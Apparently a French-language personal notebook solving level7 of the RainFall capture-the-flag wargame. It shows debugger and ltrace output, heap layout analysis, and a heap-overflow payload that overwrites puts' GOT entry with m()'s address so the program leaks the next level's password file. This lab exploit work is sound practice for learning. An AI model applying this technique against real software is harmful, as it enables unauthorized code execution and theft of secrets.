level7@RainFall:~$ ltrace ./level7 12 12
__libc_start_main(0x8048521, 3, 0xbffff6f4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                = 0x0804a008
malloc(8)                                = 0x0804a018
malloc(8)                                = 0x0804a028
malloc(8)                                = 0x0804a038
strcpy(0x0804a018, "12")                 = 0x0804a018
strcpy(0x0804a038, "12")                 = 0x0804a038
fopen("/home/user/level8/.pass", "r")    = 0
fgets( <unfinished ...>

(gdb) x/32wx 0x0804a008
0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
0x804a018:      0x00004141      0x00000000      0x00000000      0x00000011
0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
0x804a038:      0x00004141      0x00000000      0x00000000      0x00020fc1

Variable gloable : 0x8049960
fgets(var c(globale), n: 68bytes, open(.pass), mode : read)

puts(08048703  data_8048703: ~~.)

(gdb) x/32w $esp
0xbffff610:     0x08049960      0x00000044      0x00000000      0xb7e5ee55
0xbffff620:     0xb7fed280      0x00000000      0x0804a028      0x0804a008
0xbffff630:     0x08048610      0x00000000      0x00000000      0xb7e454d3
0xbffff640:     0x00000003      0xbffff6d4      0xbffff6e4      0xb7fdc858
0xbffff650:     0x00000000      0xbffff61c      0xbffff6e4      0x00000000
0xbffff660:     0x0804825c      0xb7fd0ff4      0x00000000      0x00000000
0xbffff670:     0x00000000      0x0aae8655      0x3deb2245      0x00000000
0xbffff680:     0x00000000      0x00000000      0x00000003      0x08048440

Ecrire de 0x0804a038 a 0x8049960 Non LOL :D

b *main+202

Pour afficher l'instruction actuelle : utilisation du pc

x/x $pc
0x804852a <main+9>:     0x082404c7

======= Memory map: ========
0804a000-0806b000 rwxp 00000000 00:00 0          [heap]

Bon pas trop d'idees, allons analyser l'asm

Ok bon apres quelques heures de reflexion j'en viens a me dire que :

Premier bloc (0x804a008):
- offset 0: valeur 1
- offset 4: pointeur vers buffer1 (0x804a018)

0x804a018:      0x00003231
(gdb) x/s 0x804a018
0x804a018:       "12"

Deuxième bloc (0x804a028):
- offset 0: valeur 2  
- offset 4: pointeur vers buffer2 (0x804a038)



(gdb) x/s 0x0804a038
0x804a038:       "12"

Est ce qu'on ne pourrait pas changer ces adresses pour les faire pointer ailleurs, par exemple sur m() ?

m() 08 04 84 f4
\xf4\x84\x04\x08

Essayons ca

set args $(python -c 'print "A"*20 + "\xf4\x84\x04\x08"') $(python -c 'print "A"*4') 

Essayons maintenant :

set 0x 08 04 99 60(buf c) a 0x 08 04 87 03(~~) 
      \x60\x99\x04\x08     \x03\x87\x04\x08
Pour que le puts write le contenue du fichier et non ~~
Ca marche pas, je ne peux pas ecrire dans .bss ou .rodata

set args $(python -c 'print "A"*20+ "\xf4\x84\x04\x08"') $(python -c 'print "\x60\x99\x04\x08"') 

Ok ca marche pas non plus

Je veux essayer d'ecraser la valeur de l'adresse 0x08049928 (qui correspond a l'adresse de la got du put) par l'adresse de m() 0x080484f4 pour modifier le flux d'execution et reussir a call m() 

0x08049928
0x080484f4

little endian
\x28\x99\x04\x08
\xf4\x84\x04\x08


set args $(python -c 'print "A"*20+ "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"') 

./level7 $(python -c 'print "A"*20+ "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"') 